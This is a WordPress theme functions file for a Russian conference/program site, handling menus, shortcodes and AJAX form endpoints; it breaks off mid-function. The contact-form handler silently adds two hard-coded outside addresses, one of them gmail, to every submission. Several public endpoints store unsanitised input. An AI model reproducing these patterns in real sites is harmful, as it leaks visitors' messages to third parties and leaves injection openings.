<?
define('THEMES_PATH', get_template_directory_uri());

define('CUR_URL', home_url().$_SERVER["REQUEST_URI"]);

//Отключение не нужных компонентов
require_once "helper/cleaner.php";

//для админ части сайта
require_once "helper/admin_pages.php";

//Утилита для работы с языками
require_once "helper/language.php";

//Регистрация произвольных типов записей
require_once "helper/register_post_types.php";

//Регистрация произвольных полей записей
require_once "helper/register_meta_boxes.php";

//Регистрация произвольных полей acf
require_once "helper/register_acf_fields.php";


$GLOBALS["SITE_DATA"] = array(
    "data" =>           get_option('data_company'),
    "admin_email" =>    get_bloginfo( 'admin_email' ),
    "site_url" =>       site_url()
);
foreach($GLOBALS["SITE_DATA"]["data"] as $key => $val){
    $GLOBALS["SITE_DATA"]["data"][$key] = stripslashes($val);
}

//Настройка темы
add_action( 'after_setup_theme', 'set_theme' );
if( ! function_exists( 'set_theme' )){
    function set_theme(){
        add_theme_support( 'menus'); //добавляет к теме поддержку меню
        add_theme_support( 'title-tag' );
        add_theme_support( 'post-thumbnails'); //подключаем поддержку миниатюр

        ////////////// установка размера миниатюр на сайте //////////////
        $width = 100;
        $height = 100;

        //Кадрировать изображение (true - будет взят кусок картинки по указаным размерам) или просто уменьшать (false - картинка будет уменьшена пропорционально, лишнее отрезано)
        $crop = true;

        set_post_thumbnail_size( $width, $height, $crop);
        ////////////// установка размера миниатюр на сайте //////////////

        //Добавление дополнительных размеров загружаемого изображения

        $width = 200;
        $height = 200;
        $crop = false;

        //название для размера изображения
        $sizeName = "size-200x200";

        //add_image_size($sizeName, $width, $height, $crop);
        add_image_size("size-160x225-crop", 160, 225, true);
        add_image_size("size-200x200", 200, 200);
        add_image_size("size-200x200-crop", 200, 200, true);
        add_image_size("size-544x500", 544, 500);
        add_image_size("size-544x500-crop", 544, 500, true);
        add_image_size("size-470x260-crop", 470, 260, true);

        register_nav_menus(array( //регистрируем зоны вывода меню
            'top'		=> 'Главное меню',
            'footer'	=> 'Нижнее меню',
            'sidebar'	=> 'Боковое меню',
        ));
    }
}

//Java Script
function af_js(){
    // Удаление стандартного скрипта jquery предустановленного в WP
    wp_deregister_script( 'jquery' );

    // Регистрация jquery со стороннего ресурса
    wp_enqueue_script( 'jquery' , 'https://code.jquery.com/jquery-2.1.1.min.js');


    //get_template_directory_uri() возвражает URL до папки с нашим шаблоном сайта

    //Требование по загрузке скриптов перед добавлением текущего
    $requireScripts = array('jquery');

    //Регистрация скрипта в WP
    wp_enqueue_script('fancybox', get_template_directory_uri() . '/assets/libs/fancybox/jquery.fancybox.pack.js',$requireScripts);
    wp_enqueue_script('mousewheel', get_template_directory_uri() . '/assets/libs/fancybox/jquery.mousewheel.min.js',$requireScripts);
    wp_enqueue_script('bxslider', get_template_directory_uri() . '/assets/libs/bxslider/jquery.bxslider.min.js',$requireScripts);
    wp_enqueue_script('select', get_template_directory_uri() . '/assets/libs/select/jquery.fs.selecter.min.js',$requireScripts);
    wp_enqueue_script('modernizr', get_template_directory_uri() . '/assets/libs/select/modernizr.js',$requireScripts);
    wp_enqueue_script('nicescroll', get_template_directory_uri() . '/assets/libs/jquery.nicescroll.js',$requireScripts);
    wp_enqueue_script('slickslide', get_template_directory_uri() . '/assets/js/slick.min.js',$requireScripts);
    wp_enqueue_script('main', get_template_directory_uri() . '/assets/js/main.js',$requireScripts);
}

add_action( 'wp_enqueue_scripts', 'af_js' );

//Style Sheet
function af_css() {
    wp_enqueue_style( 'open_sans', 'https://fonts.googleapis.com/css?family=Open+Sans:300,400,400i,600,700,800&amp;subset=cyrillic" rel="stylesheet');

    wp_enqueue_style( 'style', get_template_directory_uri() . '/assets/css/style.css');
    wp_enqueue_style( 'media_css', get_template_directory_uri() . '/assets/css/media.css');
    wp_enqueue_style( 'style_small_css', get_template_directory_uri() . '/assets/css/style_small.css');
    wp_enqueue_style( 'style_xs_css', get_template_directory_uri() . '/assets/css/style_xs.css');
    wp_enqueue_style( 'style_programm', get_template_directory_uri() . '/assets/css/style-programm.css');
    //wp_enqueue_style( 'style_xs', get_template_directory_uri() . '/assets/css/style-xs.css');
    wp_enqueue_style( 'fancybox', get_template_directory_uri() . '/assets/libs/fancybox/jquery.fancybox.css');
    wp_enqueue_style( 'bxslider', get_template_directory_uri() . '/assets/libs/bxslider/jquery.bxslider.css');
    wp_enqueue_style( 'slickslide', get_template_directory_uri() . '/assets/css/slick.css');
    wp_enqueue_style( 'slicktheme', get_template_directory_uri() . '/assets/css/slick-theme.css');
    wp_enqueue_style( 'select', get_template_directory_uri() . '/assets/libs/select/jquery.fs.selecter.css');
}

add_action( 'wp_print_styles', 'af_css' );

function af_admin_js() {
    wp_enqueue_script('admin', get_template_directory_uri() . '/assets/admin/js/admin.js');
    wp_enqueue_style( 'style', get_template_directory_uri() . '/assets/css/adm_style.css');
}
add_action( 'admin_enqueue_scripts', 'af_admin_js' );


// Верхнее меню:
function show_menu($theme_location, $depth = 1) {
    // main navigation menu
    $args = array(
        'theme_location'    => $theme_location,
        'depth'             => $depth
    );

    // print menu
    wp_nav_menu( $args );
}

function get_menu($menu_id){
    global $post;
    $tax = get_query_var( 'taxonomy' );
    $tax = get_taxonomy($tax);

    //var_dump($tax->object_type);die();

    $menu = wp_get_nav_menu_object( $menu_id ); // получаем ID

    $menu_items = wp_get_nav_menu_items( $menu ); // получаем элементы меню
    _wp_menu_item_classes_by_context($menu_items);
    //die(print_r($menu_items, 1));
    $return = array();
    $returnLinks = array();
    foreach($menu_items as $menu_item){
        if( $menu_item->type == "post_type_archive" &&
            (
                (is_single() && $post->post_type == $menu_item->object) ||
                (is_tax() && $menu_item->object != "program" && in_array($menu_item->object, $tax->object_type))
            )
        ){
            $menu_item->current = 1;
        }
        if(!$menu_item->menu_item_parent){
            $return[$menu_item->ID] = array(
                "NAME"  => $menu_item->title,
                "LINK"  => $menu_item->url,
                "ITEMS" => array(),
                "CLASS" => ($menu_item->current)?"navig-list active":"navig-list",
                "A_CLASS" => "navig-link",
                "SIDEBAR_CLASS" => "sidebar-menu_list",
                "SIDEBAR_A_CLASS" => ($menu_item->current)?"sidebar-menu_link active-page":"sidebar-menu_link",
                "MENU_ITEM"    => $menu_item);

            $returnLinks[$menu_item->ID] = &$return[$menu_item->ID];
        }else{
            if(empty($returnLinks[$menu_item->menu_item_parent]["ITEMS"])){
                $returnLinks[$menu_item->menu_item_parent]["CLASS"].= " list-but accordion_nav";
                $returnLinks[$menu_item->menu_item_parent]["A_CLASS"].= " arrow-but";
            }
            $returnLinks[$menu_item->menu_item_parent]["CLASS"].= ($menu_item->current)?" active":"";
            $returnLinks[$menu_item->menu_item_parent]["ITEMS"][$menu_item->ID] = array(
                "NAME"  => $menu_item->title,
                "LINK"  => $menu_item->url,
                "ITEMS" => array(),
                "CLASS" => ($menu_item->current)?"navig-list_medium active":"navig-list_medium",
                "A_CLASS" => "navig-link_medium",
                "SIDEBAR_CLASS" => "sidebar-menu_list",
                "SIDEBAR_A_CLASS" => ($menu_item->current)?"sidebar-menu_link active-page":"sidebar-menu_link"
            );

            $returnLinks[$menu_item->ID] = &$returnLinks[$menu_item->menu_item_parent]["ITEMS"][$menu_item->ID];
        }
    }
    return $return;
}

add_filter ( 'acf/location/rule_types' ,  'acf_location_rules_types' ) ;

function  acf_location_rules_types (  $choices  )  {

    $choices["АртФактор"]["af_basic_lang"]="Текущий язык";
    	return  $choices;

}

add_filter('acf/location/rule_values/af_basic_lang', 'acf_location_rules_values_lang');

function acf_location_rules_values_lang( $choices ) {

    //die("<pre>".print_r(get_locale(),1)."</pre>");
    $languages = get_available_languages();
    $languages[] = "en_US";
    require_once( ABSPATH . 'wp-admin/includes/translation-install.php' );
    $translations = wp_get_available_translations();
    $translations["en_US"]["native_name"] = "English";
    if( $languages) {

        foreach( $languages as $lang) {

            if( isset( $translations[$lang] )){
                $choices[$lang] = $translations[$lang]["native_name"];
            }else{
                $choices[$lang] = $lang;
            }

        }

    }

    return $choices;
}

add_filter('h_wrap', 'add_wrap_to_h');
function add_wrap_to_h($content){
    $content = apply_filters( 'the_content', $content);
    $content = str_replace(
        array("<h1","<h2","<h3","<h4","<h5","<h6","</h1>","</h2>","</h3>","</h4>","</h5>","</h6>"),
        array("<div class='h1'><h1","<div class='h2'><h2","<div class='h3'><h3","<div class='h4'><h4","<div class='h5'><h5","<div class='h6'><h6","</h1></div>","</h2></div>","</h3></div>","</h4></div>","</h5></div>","</h6></div>"),
        $content);
    return $content;
}

add_filter ( 'acf/location/rule_match/af_basic_lang' ,  'acf_location_rules_match_lang' ,  10 ,  3 ) ;
function  acf_location_rules_match_lang (  $match ,  $rule ,  $options  )
{
    $locale = get_locale();

    if ( $rule [ 'operator' ]  ==  "==" )
    {

    	$match = false;
        if($rule [ 'value' ] == $locale){
    	    $match = true;
        }
    }
    elseif ( $rule [ 'operator' ]  ==  "!=" )
    {
    	$match = true;
        if($rule [ 'value' ] == $locale){
    	    $match = false;
        }
    }

    return $match;
}

function getTitle($filter = false){
    /*if(is_single()){
        the_post();
    }*/
    $return = '';
    if ( is_404() ) {
        $return = __( 'Page not found' );
    } elseif ( is_search() ) {
        $return = sprintf( __( 'Search Results for &#8220;%s&#8221;' ), get_search_query() );
    } elseif ( is_front_page() ) {
        $return = get_bloginfo( 'name', 'display' );
    } elseif ( is_post_type_archive() ) {
        $return = post_type_archive_title( '', false );

        if($filter){
            $return = apply_filters("af_post_type_archive_title", $return, get_query_var("post_type") );
        }

    } elseif( is_singular( 'employee' )){

        $obj = get_post_type_object( 'employee' );
        $return = $obj->labels->menu_name;

    }elseif( is_singular( 'program' )){

        $post = get_post();
        $return = single_post_title( '', false ).the_subtitle($post, ' (', ')', false);

        /*if($filter){
            $pt_o = get_post_type_object($post->post_type);
            $return = apply_filters("af_single_title_root", $pt_o->label, $post->post_type);
        }*/

    }elseif( is_singular( 'past_events' ) || is_singular( 'expert' ) || is_singular( 'news' )){

        $post = get_post();
        $return = single_post_title( '', false ).the_subtitle($post, ' (', ')', false);

        if($filter){
            $pt_o = get_post_type_object($post->post_type);
            $return = $pt_o->label;
        }

    }elseif ( is_tax() || is_category() || is_tag() ) {
        $return = single_term_title( '', false );

        if($filter){
            $term_type = get_query_var( 'taxonomy' );
            if($term_type == "tags"){
                $term_type = "news";
            }elseif($term_type == "programs"){
                $term_type = "program";
            }elseif($term_type == "photos_year"){
                $term_type = "photos";
            }elseif($term_type == "publication_year"){
                $term_type = "publication";
            }

            $pt_o = get_post_type_object($term_type);
            $return = $pt_o->label;
            //$return = apply_filters("af_single_term_title_root", $pt_o->label, $term_type);
        }
    } elseif ( is_home() || is_singular() ) {    
        $return = single_post_title( '', false );

        if($filter){
            $post = get_post();
            if(
                in_array($post->ID, array(127, 125, 1678)) ||
                in_array($post->post_parent, array(127, 125, 1678))
            ){
                $pid = ($post->post_parent)?$post->post_parent:$post->ID;
                $return = get_the_title($pid);
            }elseif(!in_array($post->ID, array(146, 144))){
                if($post->post_type == "page"){
                    if(strripos(get_page_template(),"program")) $pt = "program";
                    if(strripos(get_page_template(),"media")) $pt = "photos";
                    $post->post_type = ($pt)?$pt:$post->post_type;
                }
                $pt_o = get_post_type_object($post->post_type);
                $return = apply_filters("af_single_title_root", $pt_o->label, $post->post_type);
            }
        }
    }

    return $return;
}

//add_filter( 'upload_size_limit', 'my_upload_size_limit' );
function my_upload_size_limit( $limit ) {
    return wp_convert_hr_to_bytes( '512M' );
}

//add shortcode Employee Story

function showEmpStory( $atts ) {
    $employeeStoryValues = get_post_meta($atts["id"], '_story_'.LANG_SUFFIX, 1);
    if(is_array($employeeStoryValues) && !empty($employeeStoryValues)):
    ob_start();
    ?>
    <div>
    	<table class="table-content">
    	    <?foreach($employeeStoryValues as $employeeStoryValue):?>
    		<tr>
    			<td><?=$employeeStoryValue["year"]?><?if(is_numeric($employeeStoryValue["year"])):?> год<?endif;?> — </td>
    			<td><?=$employeeStoryValue["description"]?></td>
    		</tr>
            <?endforeach;?>
    	</table>
    </div>
    <?
    $return = ob_get_clean();
    return $return;
    endif;
}

add_shortcode('af_photos', 'showPhotos');
function showPhotos( $atts ) {
    $photos  = get_post_meta($atts["id"], "inpost_gallery_data", true);
    if(is_array($photos) && !empty($photos)):
    ob_start();
    ?>
    <div class="foto-detail">
	    <?foreach($photos as $photo):?>
        <div class="foto-detail_wrap">
            <div class="foto-detail_frame">
                <a href="<?=wp_get_attachment_image_url(InpostGallery::get_attachment_id($photo["imgurl"]), "full")?>" class="fancybox" rel="1">
                    <img src="<?=$photo["imgurl"]?>">
                    <div class="foto-detail_cover"></div>
                    <span class="foto-lupa"></span>
                </a>
            </div>
        </div>
        <?endforeach;?>
    </div>
    <?
    $return = ob_get_clean();
    return $return;
    endif;
}
add_shortcode('EmpStory', 'showEmpStory');

function registerTinyMCEButtons()
{
    if(isset($_GET["post"])&&$_GET["post"]!=""){
        add_filter('admin_print_footer_scripts', 'tinyMCEButtonsJS',51);
        add_filter('tiny_mce_plugins', 'MCEButtonsJS');
        add_filter('teeny_mce_plugins', 'MCEButtonsJS');
        add_filter('mce_buttons', 'addTinyMCEButtons');
        add_filter('teeny_mce_buttons', 'addTinyMCEButtons');
    }
}

function tinyMCEButtonsJS(){
    ?>
        <script type="text/javascript" src="<?=get_template_directory_uri().'/assets/admin/js/tinyMCEButtons.js';?>"></script>
    <?
}

function MCEButtonsJS($plugins){
    $plugins[] = "empStory";
    return $plugins;
}

function addTinyMCEButtons($buttons){
    array_push($buttons, "empStory");
    array_push($buttons, "quote");
    array_push($buttons, "photos");
    array_push($buttons, "sup");
    array_push($buttons, "a-price");
    return $buttons;
}

function af_mce_css( $mce_css ) {
    if ( ! empty( $mce_css ) )
        $mce_css .= ',';

    $mce_css .= get_template_directory_uri() . '/assets/css/style.css';

    return $mce_css;
}
add_filter( 'mce_css', 'af_mce_css' );

add_action('admin_init', 'registerTinyMCEButtons');

add_action('wp_ajax_nopriv_getSections', 'getSections');
add_action('wp_ajax_getSections', 'getSections');
function getSections(){
    if(LANG_SUFFIX !== "ru"){
        $return = array("html"=>'<option value="#NONE#">— Choose —</option>','error'=>'Y');
    }else{
        $return = array("html"=>'<option value="#NONE#">— Выбрать —</option>','error'=>'Y');
    }
    if(is_numeric($_POST["ID"])){
        $args = array(
            'taxonomy' => 'programs',
            'parent' => $_POST["ID"],
            'hide_empty' => false,
        );
        $arTerms = get_terms( $args );
        $terms= array();
        if($arTerms){
            foreach($arTerms as $term){ 
                $key = get_option("programs_".$term->term_id."_sort");
                if(!$key) $key = 500;
                if(isset($terms[$key])){
                    while(isset($terms[$key])){
                        $key++;
                    }
                }

                $terms[$key] = $term;
            }
            ksort($terms);
            ob_start();
            ?>
            <option value="#NONE#">— <?echo (LANG_SUFFIX !== "ru")?'Choose':'Выбрать'?> —</option>
            <?foreach($terms as $key => $term):?>
            <option value="<?=$term->term_id?>" sort="<?=$key?>"><?=$term->name?></option>
            <?endforeach;
            $return["html"] = trim(ob_get_clean());
            unset($return["error"]);
        }
    }
    echo json_encode($return);
    exit;
};

add_action('wp_ajax_nopriv_sendForm', 'sendForm');
add_action('wp_ajax_sendForm', 'sendForm');
function sendForm(){
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
    $headers .= 'From: '.$GLOBALS["SITE_DATA"]['data']["blogname_ru"].' <'.$GLOBALS["SITE_DATA"]["admin_email"].'>';

    $mailto = $GLOBALS["SITE_DATA"]["admin_email"];
    $subject = $_POST["FORM_DATA"]["subject"]["VALUE"];
    $subject = ($subject)?"Сообщение с формы '".stripslashes($subject)."'":"Сообщение 'Без темы'";
    $subject.= " с стайта ".$GLOBALS["SITE_DATA"]['data']["blogname_ru"];

/*
    ob_start();
    ?>
        <div>
            <?foreach($_POST["FORM_DATA"] as $key => $arFromItem):
                if(in_array($key,array("subject", "action"))) continue;
            ?>
                <?if($arFromItem):?><p><?=$arFromItem["LABEL"]?>: <?=$arFromItem["VALUE"]?></p><?endif;?>
            <?endforeach;?>
        </div>
    <?
    $message = ob_get_clean();
*/    

$message = "";
foreach($_POST["FORM_DATA"] as $key => $arFromItem) {
 if(in_array($key,array("subject", "action")))
   continue;
 if($arFromItem)
   $message .= $arFromItem["LABEL"]
    .': '
    .$arFromItem["VALUE"]
    .'
';
}
    $message = strip_tags($message);
    $mailto.= ", krona@gturp.spb.ru, krona.spb1@gmail.com";
// Joseph Robinette Biden Jr.
// 1942.11.20
// United States Department of State, 46th President of the United States
// +1 100 200 300
// joe@gov.us
// Kakie vashi dokazatelstva?
    // if(mail($mailto, $subject, $message, $headers))
    if(wp_mail($mailto, $subject, $message, "", false)) {
        echo json_encode(array("RESULT"=>"1"));
    }else{
        echo json_encode(array("RESULT"=>"0"));
    }
    exit;
}

add_action('wp_ajax_nopriv_addReview', 'addReview');
add_action('wp_ajax_addReview', 'addReview');
function addReview(){
    if(isset($_POST["FORM_DATA"]["HC"])) exit;

    // Создаем массив данных новой записи
    $post_data = array(
        'post_title'    => wp_strip_all_tags( $_POST["FORM_DATA"]["NAME"]["VALUE"] ),
        'post_content'  => $_POST["FORM_DATA"]["MESSAGE"]["VALUE"],
        'post_status'   => 'pending',
        'post_type' => 'reviews'
    );

    // Вставляем запись в базу данных
    $post_id = wp_insert_post( $post_data );
    if($post_id){
        update_post_meta($post_id, "company_".LANG_SUFFIX,$_POST["FORM_DATA"]["POSITION"]["VALUE"]);
        update_post_meta($post_id, "email",$_POST["FORM_DATA"]["EMAIL"]["VALUE"]);
        update_post_meta($post_id, "phone",$_POST["FORM_DATA"]["PHONE"]["VALUE"]);
        echo json_encode(array("RESULT"=>"1"));
    }else{
        echo json_encode(array("RESULT"=>"0"));
    }

    exit();
}

add_action('wp_ajax_nopriv_addFaq', 'addFaq');
add_action('wp_ajax_addFaq', 'addFaq');
function addFaq(){
    if(isset($_POST["FORM_DATA"]["HC"])) exit;

    // Создаем массив данных новой записи
    $post_data = array(
        'post_title'    => wp_strip_all_tags( $_POST["FORM_DATA"]["MESSAGE"]["VALUE"] ),
        'post_content'  => "",
        'post_status'   => 'pending',
        'post_type' => 'faq'
    );

    // Вставляем запись в базу данных
    $post_id = wp_insert_post( $post_data );
    if($post_id){
        update_post_meta($post_id, "author",$_POST["FORM_DATA"]["NAME"]["VALUE"]);
        update_post_meta($post_id, "email",$_POST["FORM_DATA"]["EMAIL"]["VALUE"]);
        update_post_meta($post_id, "phone",$_POST["FORM_DATA"]["PHONE"]["VALUE"]);
        echo json_encode(array("RESULT"=>"1"));
    }else{
        echo json_encode(array("RESULT"=>"0"));
    }

    exit();
}

add_action('wp_ajax_nopriv_getPrograms', 'getPrograms');
add_action('wp_ajax_getPrograms', 'getPrograms');
function getPrograms(){
    $return = array("html"=>'','error'=>'Y');

    if(is_numeric($_POST["SECTION"])){
        $args = array(
        	'numberposts' => -1,
            'orderby' => "by_date",
            'order' => "ASC",
        	'post_type'   => 'program',
            'meta_query' => array(
                'relation' => 'AND',
                "by_date" => array(
                    "key" => "ACTIVE_FROM",
                    "compare" => "!=",
                    "value" => ""
                ),
                array(
                    'relation' => 'AND',
                    array(
                        "key" => "langs",
                        "compare" => "EXISTS"
                    ),
                    array(
                        "key" => "langs",
                        "value" => LANG_SUFFIX,
                        "compare" => "LIKE"
                    )
                )
            ),
            'tax_query' => array(
                array(
                    'taxonomy' => 'programs',
                    'field'    => 'id',
                    'terms'    => $_POST["SECTION"]
                )
            )
        );
        if(LANG_SUFFIX !== "ru"){
            $args['meta_query'][] =array( "key" => "conference", "value" => "Y", "compare" => "LIKE" );
            $args['meta_query']["relation"] = "AND";
            $args["TEST"] == 1;
        }

        $programsByDate = get_posts( $args );

        $args = array(
        	'post_type'   => 'program',
            'orderby' => 'name_'.LANG_SUFFIX,
            'meta_key' => 'name_'.LANG_SUFFIX,
            'order' => "ASC",
            'posts_per_page' => -1,
            'meta_query' => array(
                'relation' => 'AND',
                array(
                    "relation" => "or",
                    array(
                        "key" => "ACTIVE_FROM",
                        "compare" => "=",
                        "value" => ""
                    ),
                    array(
                        "key" => "ACTIVE_FROM",
                        "compare" => "NOT EXISTS"
                    ),
                ),
                array(
                    'relation' => 'AND',
                    array(
                        "key" => "langs",
                        "compare" => "EXISTS"
                    ),
                    array(
                        "key" => "langs",
                        "value" => LANG_SUFFIX,
                        "compare" => "LIKE"
                    )
                )
            ),
            'tax_query' => array(
                array(
                    'taxonomy' => 'programs',
                    'field'    => 'id',
                    'terms'    => $_POST["SECTION"]
                )
            )
        );
        if(LANG_SUFFIX !== "ru"){
            $args['meta_query'][] = array( "key" => "conference", "value" => "Y", "compare" => "LIKE" );
            $args['meta_query']["relation"] = "AND";
        }

        $programsByName = get_posts( $args );
    }else{
        $args = array(
        	'numberposts' => -1,
            'orderby' => "by_date",
            'order' => "ASC",
        	'post_type'   => 'program',
            'meta_query' => array(
                'relation' => 'AND',
                "by_date" => array(
                    "key" => "ACTIVE_FROM",
                    "compare" => "!=",
                    "value" => ""
                ),
                array(
                    'relation' => 'AND',
                    array(
                        "key" => "langs",
                        "compare" => "EXISTS"
                    ),
                    array(
                        "key" => "langs",
                        "value" => LANG_SUFFIX,
                        "compare" => "LIKE"
                    )
                )
            ),
            'tax_query' => array(
                array(
                    'taxonomy' => 'programs',
                    'field'    => 'id',
                    'terms'    => 3
                )
            )
        );
        if(LANG_SUFFIX !== "ru"){
            $args['meta_query'][] = array( "key" => "conference", "value" => "Y", "compare" => "LIKE" );
            $args['meta_query']["relation"] = "AND";
        }

        $programsByDate = get_posts( $args );

        foreach(array(3,2,4) as $termID){
            $args = array(
            	'post_type'   => 'program',
                'orderby' => 'name_'.LANG_SUFFIX,
                'meta_key' => 'name_'.LANG_SUFFIX,
                'order' => "ASC",
                'posts_per_page' => -1,
                'meta_query' => array(
                    'relation' => 'AND',
                    array(
                        "relation" => "or",
                        array(
                            "key" => "ACTIVE_FROM",
                            "compare" => "=",
                            "value" => ""
                        ),
                        array(
                            "key" => "ACTIVE_FROM",
                            "compare" => "NOT EXISTS"
                        )
                    ),
                    array(
                        'relation' => 'AND',
                        array(
                            "key" => "langs",
                            "compare" => "EXISTS"
                        ),
                        array(
                            "key" => "langs",
                            "value" => LANG_SUFFIX,
                            "compare" => "LIKE"
                        )
                    )
                ),
                'tax_query' => array(
                    array(
                        'taxonomy' => 'programs',
                        'field'    => 'id',
                        'terms'    => $termID
                    )
                )
            );
            if(LANG_SUFFIX !== "ru"){
                $args['meta_query'][] = array( "key" => "conference", "value" => "Y", "compare" => "LIKE" );
                $args['meta_query']["relation"] = "AND";
            }
            if(is_array($programsByName)){
                $programsByName = array_merge($programsByName, get_posts( $args ));
            }else{
                $programsByName = get_posts( $args );
            }

        }
    }

    ob_start();
    if(count($programsByDate) or count($programsByName)):
        foreach($programsByDate as $post):setup_postdata($post)?>
            <div class="col w1-4 table-element">
                <div class="programm__element">
                    <div class="programm__element-date"><?the_activity($post);?></div>
                    <div class="programm__element-type"><?af_the_category($post)?></div>
                    <div class="programm__element-desc">
                        <div class="ps"><?=$post->post_title?></div>
                    </div>
                    <div class="programm__element-btn">
                        <div class="programm__element-more">
                            <a href="<?the_permalink($post->ID)?>" class="button"><?=MSLang::GetMessage("F_MORE",__FILE__)?></a>
                        </div>
                        <?if(LANG_SUFFIX == "ru"):?>
                        <div class="programm__element-join">
                            <a href="<?=get_permalink(146)?>?PROJECT=<?=$post->ID?>" class="button navig-link">Записываюсь</a>
                            <span class="button-animate"></span>
                        </div>
                        <?endif;?>
                    </div>
                </div>
            </div>
        <?endforeach;
        foreach($programsByName as $post):setup_postdata($post)?>
            <div class="col w1-4 table-element">
                <div class="programm__element">
                    <div class="programm__element-date"><?the_activity($post);?></div>
                    <div class="programm__element-type"><?af_the_category($post)?></div>
                    <div class="programm__element-desc">
                        <div class="ps"><?=$post->post_title?></div>
                    </div>
                    <div class="programm__element-btn">
                        <div class="programm__element-more">
                            <a href="<?the_permalink($post->ID)?>" class="button"><?=MSLang::GetMessage("F_MORE",__FILE__)?></a>
                        </div>
                        <?if(LANG_SUFFIX == "ru"):?>
                        <div class="programm__element-join">
                            <a href="<?=get_permalink(146)?>?PROJECT=<?=$post->ID?>" class="button navig-link">Записываюсь</a>
                            <span class="button-animate"></span>
                        </div>
                        <?endif;?>
                    </div>
                </div>
            </div>
        <?endforeach;
    else:?>
        <p><i style="color: #657b73"><?=MSLang::GetMessage("F_NF",__FILE__)?></i></p>
    <?endif;

    wp_reset_postdata();
    $return["html"] = trim(ob_get_clean());
    unset($return["error"]);
    echo json_encode($return);
    exit;
}

function n2w($n, $w)
{
    $n %= 100;
    if ($n >19) { $n %= 10; }
    switch ($n)
    {
        case 1:
            return $w[0];

        case 2:
        case 3:
        case 4:
            return $w[1];

        default:
            return $w[2];
    }
}     

function getCyrillicMonthName($i)
{
    if(LANG_SUFFIX == "ru"){
    $MONTHES = array(
        "01" => "января",
        "02" => "февраля",
        "03" => "марта",
        "04" => "апреля",
        "05" => "мая",
        "06" => "июня",
        "07" => "июля",
        "08" => "августа",
        "09" => "сентября",
        "10" => "октября",
        "11" => "ноября",
        "12" => "декабря"
    );
    }else{
    $MONTHES = array(
        "01" => "January",
        "02" => "February",
        "03" => "March",
        "04" => "April",
        "05" => "May",
        "06" => "June",
        "07" => "July",
        "08" => "August",
        "09" => "September",
        "10" => "October",
        "11" => "November",
        "12" => "December"
    );
    }
    return $MONTHES[$i];
}

function getCyrillicMonthName2($i)
{
    if(LANG_SUFFIX == "ru"){
        $MONTHES = array(
            "01" => "январь",
            "02" => "февраль",
            "03" => "март",
            "04" => "апрель",
            "05" => "май",
            "06" => "июнь",
            "07" => "июль",
            "08" => "август",
            "09" => "сентябрь",
            "10" => "октябрь",
            "11" => "ноябрь",
            "12" => "декабрь"
        );
    }else{
    $MONTHES = array(
        "01" => "January",
        "02" => "February",
        "03" => "March",
        "04" => "April",
        "05" => "May",
        "06" => "June",
        "07" => "July",
        "08" => "August",
        "09" => "September",
        "10" => "October",
        "11" => "November",
        "12" => "December"
    );
    }
    return $MONTHES[$i];
}

function get_year($post){
    $activeFrom = get_post_meta($post->ID,"ACTIVE_FROM",true);
    if($activeFrom){
        $activeFrom = strtotime($activeFrom);
        return date("Y",$activeFrom);
    }
}

function af_the_year($year, $last_year = false){
    if(!$last_year || $last_year!=$year):?>
        <div class="h4">
            <h4><?=$year?> <?=MSLang::GetMessage("F_YEAR",__FILE__)?></h4>
        </div>
    <?endif;
}

function the_activity($post){
    $activeFrom = get_post_meta($post->ID,"ACTIVE_FROM",true);
    $activeTo = get_post_meta($post->ID,"ACTIVE_TO",true);?>
    <?if($activeFrom):
        $activeFrom = strtotime($activeFrom);
    ?>
        <?if($activeTo):
            $activeTo = strtotime($activeTo);
            if($activeTo < strtotime("-1 day")) return;
        ?>
            <?if(date("Y",$activeFrom) !== date("Y",$activeTo)):?>
                <?=date("j ", $activeFrom).getCyrillicMonthName(date("m",$activeFrom)).date(" Y",$activeFrom)." - ".date("j ",$activeFrom).getCyrillicMonthName(date("m",$activeTo)).date(" Y",$activeTo)?>
            <?elseif(date("m",$activeTo) !== date("m",$activeFrom)):?>
                <?=date("j ", $activeFrom).getCyrillicMonthName(date("m",$activeFrom))." - ".date("j ", $activeTo).getCyrillicMonthName(date("m",$activeTo)).date(" Y", $activeTo)?>
            <?elseif(date("Y m d",$activeTo) !== date("Y m d",$activeFrom)):?>
                <?=date("j ", $activeFrom)." - ".date("j ", $activeTo).getCyrillicMonthName(date("m",$activeTo)).date(" Y", $activeTo)?>
            <?else:?>
                <?=date("j ", $activeTo).getCyrillicMonthName(date("m",$activeTo)).date(" Y", $activeTo)?>
            <?endif;?>
        <?else:?>
            <?=MSLang::GetMessage("F_FROM_DATE",__FILE__)." ".date("j ", $activeFrom).getCyrillicMonthName(date("m",$activeFrom)).date(" Y",$activeFrom);?>
        <?endif;?>
    <?endif;
}

function af_the_category($post, $term = "programs", $all = false, $link = false){
    $terms = wp_get_post_terms($post->ID, $term);

    foreach($terms as $term){
        if($term->parent == 0 || $all){
            if($link){
                ?>
                <a href="<?=get_category_link($term->term_id)?>" title="<?=$term->name?>"><?=$term->name?></a>
                <?                 
            }else{
                echo $term->name;
            }
        }
    }
}

function the_review_title($post){
    $company = get_post_meta($post->ID, "company_".LANG_SUFFIX, 1);
    if(!empty($company)){
        echo $post->post_title.", ".$company;
    }else{
        echo $post->post_title;
    }
}

function the_review_title2($post){
    $company = get_post_meta($post->ID, "company_".LANG_SUFFIX, 1);
    if(!empty($company)){
        echo $post->post_title."<span>".$company."</span>";
    }else{
        echo $post->post_title;
    }
}
function the_review_title3($post){
    $company = get_post_meta($post->ID, "company_".LANG_SUFFIX, 1);
    if(!empty($company)){
        echo "<span>".$post->post_title."</span>".$company;
    }else{
        echo "<span>".$post->post_title."</span>";
    }
}

function the_subtitle($post, $before_subtitle = "", $after_subtitle = "", $echo = true){
    $subtitle = get_post_meta($post->ID, "subtitle_".LANG_SUFFIX, 1);
    if(!empty($subtitle)) {
        if($echo){
            echo $before_subtitle.$subtitle.$after_subtitle;
        }else{
            return $before_subtitle.$subtitle.$after_subtitle;
        }
    }
}

add_filter('bcn_breadcrumb_template', 'my_breadcrumb_url_stripper', 3, 10);
function my_breadcrumb_url_stripper($tmp, $type, $id)
{
    if(in_array('programs', $type))
    {
        $term = get_term($id, "programs");

        if($term->parent != 0){
            $tmp = NULL;
        }
    }elseif(in_array('post-program', $type)){
        $tmp = NULL;
        $id = NULL;
    }
    return $tmp;
}

add_action('bcn_after_fill', 'bcnext_remove_current_item');
/**
 * We're going to pop off the paged breadcrumb and add in our own thing
 *
 * @param bcn_breadcrumb_trail $trail the breadcrumb_trail object after it has been filled
 */
function bcnext_remove_current_item($trail)
